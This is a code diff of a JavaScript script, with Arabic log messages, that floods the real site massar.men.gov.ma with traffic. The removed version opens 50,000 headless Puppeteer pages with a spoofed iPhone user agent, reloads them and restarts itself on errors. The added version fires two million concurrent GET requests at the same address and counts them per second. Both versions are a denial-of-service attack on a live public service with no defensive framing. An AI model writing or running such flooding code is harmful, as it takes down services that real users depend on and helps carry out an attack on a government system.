@@ -1,64 +1,24 @@
-const puppeteer = require('puppeteer');
+const axios = require('axios');
 
 async function run() {
-  try {
-    const browser = await puppeteer.launch({ headless: true });
-    const userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
-    let pageCount = 0;
-    const refreshFrequency = 5;
-    let pagesToUpdate = [];
+  const url = 'https://massar.men.gov.ma';
+  const concurrency = 2000000;
+  let requestsCount = 0;
 
-    const updatePages = async () => {
-      console.log(`تحديث ${pagesToUpdate.length} صفحات`);
-      const updatePromises = pagesToUpdate.map(async (page) => {
-        try {
-          await page.reload({ waitUntil: 'networkidle0', timeout: 0 });
-        } catch (error) {
-          console.error('حدث خطأ أثناء إعادة تحميل الصفحة:', error);
-          throw error; // إعادة رمي الخطأ للتوقف
-        }
-      });
-      await Promise.all(updatePromises);
-      pagesToUpdate = [];
-    };
+  const requests = [];
+  for (let i = 0; i < concurrency; i++) {
+    requests.push(axios.get(url));
+  }
 
-    for (let i = 0; i < 50000; i++) {
-      const page = await browser.newPage();
-      await page.setUserAgent(userAgent);
-      await page.setViewport({ width: 414, height: 896 });
+  setInterval(() => {
+    console.log(`تم إرسال ${requestsCount} طلب في الثانية الحالية.`);
+    requestsCount = 0;
+  }, 1000);
 
-      setTimeout(async () => {
-        try {
-          await page.goto('https://massar.men.gov.ma', { timeout: 0 });
-          pageCount++;
-
-          pagesToUpdate.push(page);
-          if (pagesToUpdate.length >= refreshFrequency) {
-            await updatePages();
-          }
-        } catch (error) {
-          console.error('حدث خطأ أثناء فتح الصفحة:', error);
-          throw error; // إعادة رمي الخطأ للتوقف
-        }
-      }, i * 10); // زيادة السرعة بتقليل فاصل الزمن بين فتح كل صفحة جديدة
-    }
-
-    if (pagesToUpdate.length > 0) {
-      await updatePages();
-    }
-
-    console.log(`تم فتح ${pageCount} صفحة وتحديثها بنجاح.`);
-  } catch (error) {
-    console.error('حدث خطأ أثناء تنفيذ الكود:', error);
-    console.log('إعادة التشغيل...');
-    await run(); // إعادة تشغيل الكود في حالة حدوث خطأ
+  for (const request of requests) {
+    await request;
+    requestsCount++;
   }
 }
 
-// تكرار تشغيل الكود 10 مرات
-(async () => {
-  for (let i = 0; i < 10; i++) {
-    console.log(`تشغيل ${i + 1}`);
-    await run();
-  }
-})();
+run();
